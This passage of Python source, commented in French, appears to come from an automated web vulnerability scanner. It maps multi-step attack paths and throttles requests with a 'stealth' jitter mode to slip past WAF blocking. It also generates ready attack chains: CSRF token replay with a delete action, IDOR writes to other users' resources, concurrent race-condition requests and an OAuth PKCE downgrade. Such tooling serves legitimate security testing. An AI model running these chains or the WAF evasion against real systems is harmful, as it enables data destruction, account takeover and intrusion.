    attack_type: str          # "open_redirect_chain" | "oauth_flow" | "csrf_chain" | ...
    description: str


class FlowGraphAnalyzer:
    """
    v5.18 — Construit un graphe de flux inter-endpoints et identifie les
    chemins d'attaque multi-étapes que les scanners traditionnels ratent.

    Raisonnement : un SSRF isolé sur /api/fetch est intéressant, mais si
    /api/fetch → (redirect) → /admin/action → (form POST) → /auth/callback,
    c'est une chaîne critique. Ce graphe modélise ces transitions.

    Fonctionnalités :
      - Construction automatique depuis l'EndpointBus
      - Détection de cycles (boucles de redirect potentielles)
      - Identification de chemins OAuth/OIDC (authorization → token → callback)
      - Chemins de réinitialisation de mot de passe (password_reset → email → ...)
      - Score de risque par chemin selon les transitions

    Usage dans l'Engine :
        flow = FlowGraphAnalyzer()
        flow.ingest_bus(bus)
        attack_paths = flow.find_attack_paths()
        for path in attack_paths:
            engine.emit_finding(path.to_finding())
    """

    def __init__(self) -> None:
        # Graphe : url → liste d'arêtes sortantes
        self._graph: dict[str, list[FlowEdge]] = defaultdict(list)
        self._nodes: set[str] = set()

    def add_edge(self, edge: FlowEdge) -> None:
        """Ajoute une arête au graphe de flux."""
        self._graph[edge.src_url].append(edge)
        self._nodes.add(edge.src_url)
        self._nodes.add(edge.dst_url)

    def ingest_bus(self, bus: "EndpointBus") -> None:
        """
        Reconstruit le graphe depuis les endpoints du bus.
        Infère les arêtes depuis les forms, les redirects, et les patterns d'URL.
        """
        for ep in bus.snapshot:
            parsed = urlparse(ep.url)
            path = parsed.path.lower()

            # Détecter les endpoints qui sont probablement des callback/redirect
            for param in ep.params:
                if self._is_redirect_param(param):
                    # Cet endpoint peut rediriger vers une valeur de paramètre
                    self.add_edge(FlowEdge(
                        src_url=ep.url,
                        dst_url=f"<{param}_value>",
                        edge_type="redirect",
                        param_carried=[param],
                    ))

            # Détecter les patterns OAuth
            if any(kw in path for kw in ["/oauth", "/authorize", "/auth/", "/login", "/sso"]):
                self._infer_oauth_edges(ep)

            # Détecter les patterns password reset
            if any(kw in path for kw in ["/reset", "/forgot", "/password", "/recover"]):
                self._infer_reset_edges(ep)

    def _infer_oauth_edges(self, ep: "DiscoveredEndpoint") -> None:
        """Infère les arêtes OAuth depuis un endpoint d'autorisation."""
        parsed = urlparse(ep.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for callback_param in ["redirect_uri", "callback", "return_to", "next"]:
            if callback_param in ep.params:
                self.add_edge(FlowEdge(
                    src_url=ep.url,
                    dst_url=f"{base}/callback",
                    edge_type="oauth_flow",
                    param_carried=["code", "state", callback_param],
                ))

    def _infer_reset_edges(self, ep: "DiscoveredEndpoint") -> None:
        """Infère les arêtes password reset."""
        self.add_edge(FlowEdge(
            src_url=ep.url,
            dst_url="<email_inbox>",
            edge_type="email_link",
            param_carried=["email", "token"],
        ))

    def find_attack_paths(self, max_depth: int = 5) -> list[AttackPath]:
        """
        Cherche tous les chemins d'attaque multi-étapes dans le graphe.
        Utilise un DFS avec détection de cycles.

        Returns:
            liste de chemins d'attaque triés par score de risque décroissant
        """
        paths: list[AttackPath] = []

        for start_node in self._nodes:
            self._dfs_paths(start_node, [start_node], [], set(), paths, max_depth)

        # Dédupliquer et trier
        seen: set[tuple] = set()
        unique_paths: list[AttackPath] = []
        for p in paths:
            key = tuple(p.steps)
            if key not in seen:
                seen.add(key)
                unique_paths.append(p)

        return sorted(unique_paths, key=lambda p: -p.risk_score)

    def _dfs_paths(
        self,
        current: str,
        path: list[str],
        edges: list[str],
        visited: set[str],
        results: list[AttackPath],
        max_depth: int,
    ) -> None:
        """DFS récursif pour construire les chemins d'attaque."""
        if len(path) > max_depth:
            return

        # Évaluer le chemin actuel si ≥ 2 étapes
        if len(path) >= 2:
            attack = self._classify_path(path, edges)
            if attack:
                results.append(attack)

        if current not in self._graph:
            return

        for edge in self._graph[current]:
            if edge.dst_url not in visited:
                self._dfs_paths(
                    edge.dst_url,
                    path + [edge.dst_url],
                    edges + [edge.edge_type],
                    visited | {current},
                    results,
                    max_depth,
                )

    def _classify_path(self, steps: list[str], edge_types: list[str]) -> AttackPath | None:
        """
        Classifie un chemin multi-étapes en type d'attaque et lui assigne un score.
        Retourne None si le chemin n'est pas intéressant.
        """
        path_str = " → ".join(steps)
        edge_str = " → ".join(edge_types)

        # Chaîne OAuth + redirect → Account Takeover
        if "oauth_flow" in edge_types and "redirect" in edge_types:
            return AttackPath(
                steps=steps, edge_types=edge_types,
                risk_score=0.95,
                attack_type="oauth_account_takeover",
                description=(
                    f"Chaîne OAuth avec redirect non validé → Account Takeover potentiel.\n"
                    f"Chemin: {path_str}"
                ),
            )

        # Redirect → redirect (open redirect chain)
        if edge_types.count("redirect") >= 2:
            return AttackPath(
                steps=steps, edge_types=edge_types,
                risk_score=0.75,
                attack_type="open_redirect_chain",
                description=(
                    f"Chaîne de redirections multiples → possible bypass de whitelist.\n"
                    f"Chemin: {path_str}"
                ),
            )

        # Email link + redirect = password reset poisoning
        if "email_link" in edge_types and "redirect" in edge_types:
            return AttackPath(
                steps=steps, edge_types=edge_types,
                risk_score=0.90,
                attack_type="password_reset_poisoning",
                description=(
                    f"Lien email + redirect → Password Reset Poisoning potentiel.\n"
                    f"Chemin: {path_str}"
                ),
            )

        return None

    @staticmethod
    def _is_redirect_param(param: str) -> bool:
        """Détermine si un paramètre est probablement un paramètre de redirection."""
        REDIRECT_PARAMS = {
            "url", "redirect", "next", "return", "goto", "dest",
            "destination", "ref", "href", "src", "target", "forward",
            "redirect_uri", "callback", "return_url", "success_url",
            "cancel_url", "continue", "redir",
        }
        return param.lower() in REDIRECT_PARAMS


# ─────────────────────────── AdaptiveRateController ─────────────────────────

@dataclass
class RateStats:
    """Statistiques de taux pour un module/endpoint donné."""
    requests: int = 0
    waf_blocks: int = 0       # 403/406/429 reçus
    errors: int = 0           # 5xx reçus
    avg_latency_ms: float = 0.0
    last_block_ts: float = 0.0
    consecutive_blocks: int = 0


class AdaptiveRateController:
    """
    v5.18 — Contrôle adaptatif du taux de requêtes par module et par cible.

    Problèmes résolus par rapport au jitter simple de la v5.7 :
      - Backoff exponentiel sur WAF block (pas juste un délai fixe)
      - Cooldown par module indépendant (le module XSS peut ralentir
        sans ralentir le module headers qui ne déclenche pas le WAF)
      - Détection de patterns 429/Retry-After et respect dynamique
      - Mode "stealth" automatique si WAF très agressif détecté
      - Fenêtre glissante pour éviter les burst non intentionnels

    Usage :
        ctrl = AdaptiveRateController()
        await ctrl.wait(module="xss", url="https://target.com/api/users")
        resp = await req.get(url)
        ctrl.record_response(module="xss", status=resp.status,
                             latency_ms=resp.elapsed * 1000)
    """

    # Taux par défaut : délai entre requêtes par module (secondes)
    _DEFAULT_DELAY: dict[str, float] = {
        "xss":             0.05,
        "sqli":            0.10,
        "ssti":            0.10,
        "cmdi":            0.15,
        "ssrf":            0.08,
        "lfi":             0.08,
        "deserialization": 0.20,
        "race_condition":  0.01,   # volontairement rapide
        "default":         0.05,
    }

    # Facteurs de backoff selon les blocs consécutifs
    _BACKOFF_FACTORS = [1.0, 1.5, 2.5, 4.0, 8.0, 15.0, 30.0]

    def __init__(self) -> None:
        # module_name → RateStats
        self._stats: dict[str, RateStats] = defaultdict(RateStats)
        # module_name → timestamp du dernier envoi
        self._last_request_ts: dict[str, float] = {}
        # v5.20 — Stealth mode PER-MODULE (plus global)
        # Un module agressif ne pénalise plus les autres
        self._stealth_mode: dict[str, bool] = {}
        self._stealth_delay_factor: dict[str, float] = {}
        # v5.20 — Tracking du dernier bloc per-module pour décroissance du stealth
        self._last_block_ts: dict[str, float] = {}
        # v5.20 — Sliding window de 60s pour le block rate
        self._recent_blocks: dict[str, list[float]] = defaultdict(list)

    async def wait(self, module: str, url: str = "") -> None:
        """
        Attendre le délai adaptatif approprié avant d'envoyer une requête.
        Doit être appelé avec await avant chaque requête.
        """
        delay = self._compute_delay(module)
        last = self._last_request_ts.get(module, 0.0)
        elapsed = time.monotonic() - last
        remaining = delay - elapsed
        if remaining > 0:
            await asyncio.sleep(remaining)
        self._last_request_ts[module] = time.monotonic()
        self._stats[module].requests += 1

    def record_response(
        self,
        module: str,
        status: int,
        latency_ms: float = 0.0,
        retry_after: int = 0,
    ) -> None:
        """
        Enregistre une réponse reçue et ajuste les stats internes.

        Args:
            module:      nom du module qui a fait la requête
            status:      code HTTP reçu
            latency_ms:  latence en millisecondes
            retry_after: valeur du header Retry-After si présent (secondes)
        """
        stats = self._stats[module]

        now = time.monotonic()
        if status in (403, 406, 429, 503):
            stats.waf_blocks += 1
            stats.consecutive_blocks += 1
            stats.last_block_ts = now
            self._last_block_ts[module] = now

            # v5.20 — Sliding window 60s
            self._recent_blocks[module].append(now)
            self._recent_blocks[module] = [t for t in self._recent_blocks[module] if now - t < 60]

            # Si Retry-After présent → respecter
            if retry_after > 0:
                self._last_request_ts[module] = now + retry_after

            # v5.20 — Stealth per-module (seuil = 5 blocs dans la fenêtre de 60s)
            recent = len(self._recent_blocks[module])
            if recent >= 5:
                self._stealth_mode[module] = True
                cur = self._stealth_delay_factor.get(module, 1.0)
                self._stealth_delay_factor[module] = min(8.0, cur * 1.5)
        elif status < 500:
            # Requête réussie → reset backoff du module
            stats.consecutive_blocks = max(0, stats.consecutive_blocks - 1)
            # v5.20 — Réduire progressivement le stealth factor si 10+ succès consécutifs
            if stats.consecutive_blocks == 0 and module in self._stealth_mode:
                cur = self._stealth_delay_factor.get(module, 1.0)
                new_factor = max(1.0, cur * 0.85)
                self._stealth_delay_factor[module] = new_factor
                if new_factor <= 1.05:
                    self._stealth_mode.pop(module, None)

        if status >= 500:
            stats.errors += 1

        # Mise à jour latence moyenne (rolling average)
        if latency_ms > 0:
            n = stats.requests
            stats.avg_latency_ms = (stats.avg_latency_ms * (n - 1) + latency_ms) / n if n > 1 else latency_ms

    def _compute_delay(self, module: str) -> float:
        """v5.20 — Délai adaptatif per-module avec stealth individuel."""
        base = self._DEFAULT_DELAY.get(module, self._DEFAULT_DELAY["default"])
        stats = self._stats[module]

        # Backoff exponentiel sur blocs consécutifs
        backoff_idx = min(stats.consecutive_blocks, len(self._BACKOFF_FACTORS) - 1)
        delay = base * self._BACKOFF_FACTORS[backoff_idx]

        # v5.20 — Stealth per-module uniquement
        if self._stealth_mode.get(module, False):
            delay *= self._stealth_delay_factor.get(module, 1.0)

        # Jitter ±25% avec distribution gaussienne (moins prévisible que uniform)
        import random as _r
        jitter = max(0.6, min(1.4, 1.0 + _r.gauss(0, 0.15)))
        return delay * jitter

    def waf_block_rate(self, module: str) -> float:
        """v5.20 — Taux de blocs WAF sur la fenêtre glissante de 60s."""
        stats = self._stats[module]
        if stats.requests == 0:
            return 0.0
        recent = len(self._recent_blocks.get(module, []))
        # Blend entre fenêtre glissante et historique total
        total_rate = stats.waf_blocks / stats.requests
        window_rate = recent / max(stats.requests, 1)
        return round((total_rate + window_rate) / 2, 3)

    def is_stealth_active(self, module: str = "") -> bool:
        """v5.20 — Stealth par module. Sans argument = vrai si au moins un module en stealth."""
        if module:
            return self._stealth_mode.get(module, False)
        return bool(self._stealth_mode)

    def summary(self) -> dict:
        """Résumé des stats de taux pour le rapport final."""
        return {
            module: {
                "requests": s.requests,
                "waf_blocks": s.waf_blocks,
                "block_rate": round(s.waf_blocks / max(s.requests, 1), 3),
                "avg_latency_ms": round(s.avg_latency_ms, 1),
                "consecutive_blocks": s.consecutive_blocks,
            }
            for module, s in self._stats.items()
        }


# ─────────────────────────── GraphPayloadChain ──────────────────────────────

@dataclass
class ChainedPayload:
    """Un payload chaîné multi-étapes pour une attaque en plusieurs requêtes."""
    name: str
    steps: list[dict]      # [{method, path, params, body, description}]
    vuln_type: str
    expected_indicator: str   # ce qu'on cherche dans la réponse finale
    severity: str


class GraphPayloadChain:
    """
    v5.18 — Générateur de payloads chaînés multi-requêtes.

    Les vulnérabilités comme le CSRF, la race condition exploitable,
    le privilege escalation ou le session fixation nécessitent plusieurs
    requêtes dans un ordre précis. Ce module génère ces séquences.

    Exemples de chaînes implémentées :
      - CSRF token harvest → CSRF exploit (2 requêtes)
      - Race condition : N requêtes simultanées sur un endpoint atomique
      - IDOR escalation : GET id=1 → PATCH id=2 (lire puis écrire)
      - OAuth PKCE downgrade → authorization code intercept

    Usage :
        chain_gen = GraphPayloadChain()
        chains = chain_gen.chains_for_endpoint(ep, tech_hints=["php", "wordpress"])
        for chain in chains:
            result = await executor.run_chain(chain)
    """

    def chains_for_endpoint(
        self,
        ep: "DiscoveredEndpoint",
        tech_hints: list[str] | None = None,
    ) -> list[ChainedPayload]:
        """
        Génère les chaînes de payloads applicables à un endpoint.

        Args:
            ep:          endpoint cible
            tech_hints:  technologies détectées (pour adapter les chaînes)
        Returns:
            liste de chaînes applicables triées par sévérité
        """
        chains: list[ChainedPayload] = []
        url = ep.url
        method = ep.method.upper()
        params = ep.params

        # CSRF harvest + exploit
        if method == "GET" and any(
            p in params for p in ["csrf_token", "_token", "authenticity_token", "nonce"]
        ):
            chains.append(self._csrf_harvest_chain(url, params))

        # IDOR read → write
        id_params = [p for p in params if any(
            kw in p.lower() for kw in ["id", "uid", "user", "account"]
        )]
        if id_params and method in ("GET", "POST"):
            chains.append(self._idor_rw_chain(url, id_params[0]))

        # Race condition sur endpoint modifiant un état
        if method in ("POST", "PUT", "PATCH") and any(
            kw in url.lower() for kw in ["/purchase", "/order", "/transfer",
                                          "/redeem", "/vote", "/apply", "/submit"]
        ):
            chains.append(self._race_condition_chain(url, ep.form_inputs))

        # OAuth PKCE downgrade (si endpoint OAuth)
        if any(kw in url.lower() for kw in ["/oauth", "/authorize", "/auth"]):
            if tech_hints and any(t in tech_hints for t in ["oauth", "oidc", "sso"]):
                chains.append(self._oauth_pkce_downgrade_chain(url, params))

        return chains

    # ── Chaînes prédéfinies ───────────────────────────────────────────────────

    @staticmethod
    def _csrf_harvest_chain(url: str, params: list[str]) -> ChainedPayload:
        return ChainedPayload(
            name="CSRF Token Harvest → Exploit",
            vuln_type="csrf",
            severity="HIGH",
            expected_indicator="200 OR action_performed",
            steps=[
                {
                    "step": 1,
                    "method": "GET",
                    "url": url,
                    "description": "Récolter le CSRF token depuis la page",
                    "extract": {"csrf_token": r'name=["\']?(?:csrf_token|_token)["\']?\s+value=["\']?([^"\'>\s]+)'},
                },
                {
                    "step": 2,
                    "method": "POST",
                    "url": url,
                    "description": "Rejouer l'action avec le token récolté + param modifié",
                    "inject_extracted": ["csrf_token"],
                    "body_override": {"action": "delete", "target_id": "FUZZ"},
                },
            ],
        )

    @staticmethod
    def _idor_rw_chain(url: str, id_param: str) -> ChainedPayload:
        return ChainedPayload(
            name=f"IDOR Read→Write via `{id_param}`",
            vuln_type="idor",
            severity="CRITICAL",
            expected_indicator="200 on foreign resource write",
            steps=[
                {
                    "step": 1,
                    "method": "GET",
                    "url": url,
                    "params": {id_param: "OWN_ID"},
                    "description": "Lecture de sa propre ressource (baseline)",
                },
                {
                    "step": 2,
                    "method": "GET",
                    "url": url,
                    "params": {id_param: "OWN_ID+1"},
                    "description": "Lecture d'une ressource adjacente (IDOR read)",
                    "success_if": "status==200 AND body differs from step1",
                },
                {
                    "step": 3,
                    "method": "PUT",
                    "url": url,
                    "params": {id_param: "OWN_ID+1"},
                    "body": {"data": "PHANTOM_WRITE_TEST"},
                    "description": "Écriture sur la ressource d'autrui (IDOR write)",
                    "success_if": "status in (200, 201, 204)",
                },
            ],
        )

    @staticmethod
    def _race_condition_chain(url: str, form_inputs: dict) -> ChainedPayload:
        return ChainedPayload(
            name="Race Condition — Requêtes Simultanées",
            vuln_type="race_condition",
            severity="HIGH",
            expected_indicator="Ressource consommée N>1 fois OR état incohérent",
            steps=[
                {
                    "step": 1,
                    "method": "POST",
                    "url": url,
                    "body": form_inputs or {"amount": "1", "action": "redeem"},
                    "description": "Envoyer N≥15 requêtes POST simultanément (last-byte sync)",
                    "concurrent": 15,
                    "technique": "last_byte_sync",
                },
            ],
        )

    @staticmethod
    def _oauth_pkce_downgrade_chain(url: str, params: list[str]) -> ChainedPayload:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        return ChainedPayload(
            name="OAuth PKCE Downgrade → Authorization Code Intercept",
            vuln_type="oauth_misconfig",
            severity="CRITICAL",
            expected_indicator="authorization code retourné sans vérification PKCE",
            steps=[
                {
                    "step": 1,
                    "method": "GET",
                    "url": url,
                    "params": {
                        "response_type": "code",
                        "client_id": "FUZZ_CLIENT_ID",
                        "redirect_uri": f"{base}/callback",
                        "scope": "openid profile email",
                        # Intentionnellement pas de code_challenge → downgrade PKCE
                    },
                    "description": "Requête OAuth sans code_challenge (test downgrade PKCE)",
                    "success_if": "redirect to callback with ?code=",
                },
                {
                    "step": 2,
                    "method": "POST",
                    "url": f"{base}/token",
                    "body": {
                        "grant_type": "authorization_code",
                        "code": "EXTRACTED_FROM_STEP1",
                        "redirect_uri": f"{base}/callback",
                        "client_id": "FUZZ_CLIENT_ID",
                        # Pas de code_verifier → si le serveur accepte c'est confirmé
                    },
                    "description": "Échange code→token sans code_verifier (PKCE bypassé)",
                    "success_if": "status==200 AND access_token in body",
                },
            ],
        )
